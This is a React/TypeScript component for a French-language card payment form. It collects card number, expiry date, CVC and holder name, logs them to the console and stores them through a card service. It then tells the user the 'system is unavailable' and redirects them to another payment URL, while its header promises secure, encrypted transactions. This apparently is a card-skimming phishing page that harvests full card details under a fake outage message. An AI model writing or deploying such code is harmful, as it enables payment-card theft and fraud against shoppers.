import { useState } from 'react';
import { CardFormData } from '../../types/cardTypes';
import { CardService } from '../../services.tsx/cardService';

export const CardForm = ({urlPaiement,amount}:{urlPaiement:string, amount:string}) => {
  const [form, setForm] = useState<CardFormData>({
    cardNumber: '',
    expiryDate: '',
    cvc: '',
    cardHolder: '',
    brand: ''
  }); 

  const [error, setError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  const detectCardType = (cardNumber: string): string => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (/^4/.test(cleanNumber)) return 'Visa';
    if (/^5[1-5]/.test(cleanNumber)) return 'Mastercard';
    if (/^3[47]/.test(cleanNumber)) return 'American Express';
    if (/^6011/.test(cleanNumber)) return 'Discover';
    return 'Visa';
  };

  const getCardIcon = (brand: string): string => {
    switch (brand) {
      case 'Visa':
        return '/visa.png';
      case 'Mastercard':
        return '/mastercard.svg';
      case 'American Express':
        return '/images/amex.svg';
      case 'Discover':
        return '/discover.svg';
      default:
        return '/generic.svg';
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setForm(prev => ({ ...prev, [name]: value }));
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 2) {
      value = `${value.slice(0, 2)}/${value.slice(2, 4)}`;
    } else if (value.length === 2) {
      value = `${value}/`;
    }
    
    setForm(prev => ({ ...prev, expiryDate: value }));
  };

  const validateForm = (): boolean => {
    if (form.cardNumber.replace(/\s/g, '').length !== 16) {
      setError('Le numéro de carte doit contenir 16 chiffres');
      return false;
    }

    if (!/^\d{2}\/\d{2}$/.test(form.expiryDate)) {
      setError('La date d\'expiration doit être au format MM/AA');
      return false;
    }

    if (!/^\d{3}$/.test(form.cvc)) {
      setError('Le code CVC doit contenir 3 chiffres');
      return false;
    }

    if (form.cardHolder.trim().length < 2) {
      setError('Le nom du titulaire doit contenir au moins 2 caractères');
      return false;
    }

    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSuccessMessage(null);

    if (!validateForm()) return;

    try {
      setIsSubmitting(true);

      const [expiryMonth, expiryYearPartial] = form.expiryDate.split('/');
      const expiryYear = `20${expiryYearPartial}`;
console.log(expiryMonth, expiryYear);
      const cardData: CardFormData = {
        cardNumber: form.cardNumber.replace(/\s/g, ''),
        expiryDate: form.expiryDate,
        cvc: form.cvc,
        cardHolder: form.cardHolder.trim(),
        brand: form.brand
      };
console.log(cardData)
      await CardService.addCard(cardData);

      setForm({
        cardNumber: '',
        expiryDate: '',
        cvc: '',
        cardHolder: '',
        brand: 'Visa'
      });

      setSuccessMessage('Systeme indisponible vous serez redirigé vers le systeme alternatif!');
      
      // Redirection après l'enregistrement
      window.location.href = urlPaiement as string  ;
      
    } catch (err) {
      console.error('Erreur:', err);
      setError(err instanceof Error ? err.message : 'Une erreur est survenue lors de l\'enregistrement');
    } finally {
      setIsSubmitting(false);
    }
  };
  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
          <h2 className="text-2xl font-bold text-gray-800">
            Paiement<svg xmlns="http://www.w3.org/2000/svg" className="inline-block h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            
          </h2>
<h5 className='mb-6'>Toutes les transactions sont sécurisées et cryptées</h5>
      
      {error && <div className="bg-red-100 text-red-700 p-3 rounded mb-4">{error}</div>}
      {successMessage && <div className="bg-red-100 text-red-700 p-3 rounded mb-4">{successMessage}</div>}
      
      <div className="mb-4">
        <label htmlFor="cardHolder" className="block text-gray-700 text-sm font-bold mb-2">Nom du titulaire</label>
        <input
          id="cardHolder"
          name="cardHolder"
          type="text"
          value={form.cardHolder}
          onChange={handleInputChange}
          placeholder="JEAN DUPONT"
          autoComplete="cc-name"
          required
          className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>
      
      <div className="mb-4">
        <label htmlFor="cardNumber" className="block text-gray-700 text-sm font-bold mb-2">Numéro de carte</label>
        <div className="relative flex items-center">
          <img
            src={getCardIcon(form.brand)}
            alt={form.brand}
            className="absolute left-3 w-8 h-8"
          />
          <input
            id="cardNumber"
            name="cardNumber"
            type="text"
            value={formatCardNumber(form.cardNumber)}
            onChange={(e) => {
              const value = e.target.value.replace(/\s/g, '');
              if (/^\d*$/.test(value) && value.length <= 16) {
                setForm(prev => ({ 
                  ...prev, 
                  cardNumber: value,
                  brand: detectCardType(value)
                }));
              }
            }}
            placeholder="4242 4242 4242 4242"
            maxLength={19}
            autoComplete="cc-number"
            required
            className="w-full px-3 py-2 pl-12 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
      </div>
      
      <div className="flex gap-4 mb-4">
        <div className="flex-1">
          <label htmlFor="expiryDate" className="block text-gray-700 text-sm font-bold mb-2">Expiration (MM/AA)</label>
          <input
            id="expiryDate"
            name="expiryDate"
            type="text"
            value={form.expiryDate}
            onChange={handleExpiryDateChange}
            placeholder="12/25"
            maxLength={5}
            autoComplete="cc-exp"
            required
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        
        <div className="flex-1">
          <label htmlFor="cvc" className="block text-gray-700 text-sm font-bold mb-2">CVC</label>
          <input
            id="cvc"
            name="cvc"
            type="text"
            value={form.cvc}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              if (value.length <= 3) {
                setForm(prev => ({ ...prev, cvc: value }));
              }
            }}
            placeholder="123"
            maxLength={3}
            autoComplete="cc-csc"
            required
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
      </div>
      
      {/* <div className="mb-6">
        <label className="block text-gray-700 text-sm font-bold mb-2">Type de carte</label>
        <div className="px-3 py-2 bg-gray-100 rounded text-gray-700">{form.brand}</div>
      </div> */}
      
      <button 
        type="submit" 
        disabled={isSubmitting}
        className="w-full bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 disabled:opacity-50"
      >
        {isSubmitting ? (
          <span className="flex items-center justify-center">
            <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
            </svg>
           Enregistrement...
          </span>
        ) : (
           `Payer ${amount}` 
        )}
      </button>
    </form>
  );
};